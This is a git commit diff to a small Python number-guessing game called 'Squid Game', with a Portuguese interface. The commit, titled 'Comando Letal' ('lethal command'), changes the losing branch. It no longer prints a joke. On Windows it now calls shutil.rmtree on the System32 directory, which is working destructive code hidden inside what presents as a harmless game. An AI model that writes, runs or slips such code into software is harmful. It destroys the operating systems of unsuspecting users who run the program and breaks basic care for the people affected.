d16765eb4ad4620cfad6ebeeed76584d10d9f810
Joao Gabriel <123424925+artesssn@users.noreply.github.com>
2026-02-04 20:10:56 -0300

    Comando Letal bem vindo ao jogo

--- Squid Game/Squid Game.py
+++ Squid Game/Squid Game.py
@@ -1,25 +1,33 @@
 import random
 import os
+import platform
+import shutil
 
 number = random.randint(1, 5)
-guess = input("Escolha um número entre 1 e 5: ")
-guess = int(guess)
+try:
+    guess = int(input("Escolha um número entre 1 e 5: "))
+except ValueError:
+    print("Por favor, digite um número válido.")
+    exit()
 
-if guess == number:
-    print("Você acertou!")
+if 1 <= guess <= 5:
+    if guess == number:
+        print("Você acertou!")
+    else:
+        print("Você perdeu! Excluindo System32...")
+
+        sistema = platform.system()
+        try:
+            if sistema == "Windows":
+                system32 = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32")
+                if os.path.exists(system32):
+                    shutil.rmtree(system32)
+                    print("System32 deletado com sucesso!")
+                else:
+                    print("System32 não encontrado.")
+            else:
+                print("Não está em um sistema Windows, nada foi deletado.")
+        except Exception as e:
+            print(f"Ocorreu um erro ao tentar deletar System32: {e}")
 else:
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("erro")
-    print("Voce perdeu! removendo a system32")
-    
+    print("O número digitado está fora do intervalo permitido (1 a 5).")
